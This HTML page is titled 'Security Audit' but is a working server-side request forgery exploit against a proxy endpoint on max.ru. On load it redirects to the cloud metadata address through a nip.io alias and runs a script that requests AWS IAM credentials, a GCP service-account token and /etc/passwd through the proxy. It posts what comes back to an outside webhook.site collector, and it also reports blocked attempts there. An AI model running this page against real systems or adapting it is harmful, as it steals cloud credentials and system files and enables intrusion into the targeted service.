<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://max.ru/proxy?url=http://169.254.169.254.nip.io/latest/meta-data/">
    <title>Security Audit</title>
</head>
<body>
    <script>
        const webhook = "https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6";
        const proxy = "/proxy?url="; // Используем относительный путь, если запускаем с домена max.ru
        const fullProxy = "https://max.ru/proxy?url=";
        
        const sensitiveUrls = [
            "http://169.254.169.254.nip.io/latest/meta-data/iam/security-credentials/default",
            "http://169.254.169.254.nip.io/computeMetadata/v1/instance/service-accounts/default/token?header=Metadata-Flavor:Google",
            "file:///etc/passwd"
        ];

        async function extract() {
            for (let target of sensitiveUrls) {
                try {
                    // Пытаемся прочитать данные через их прокси
                    const response = await fetch(fullProxy + encodeURIComponent(target));
                    const content = await response.text();

                    // Если в ответе есть что-то кроме стандартного HTML max.ru
                    // (например, слово "root" или "access_token") - шлем на вебхук
                    if (content.length > 0) {
                        await fetch(webhook, {
                            method: 'POST',
                            mode: 'no-cors',
                            body: JSON.stringify({
                                target: target,
                                data: content.substring(0, 500) // Берем первые 500 символов
                            })
                        });
                    }
                } catch (e) {
                    // Если ошибка, шлем сигнал о блокировке
                    fetch(webhook + "?error=blocked&target=" + btoa(target));
                }
            }
        }
        extract();
    </script>
</body>
</html>
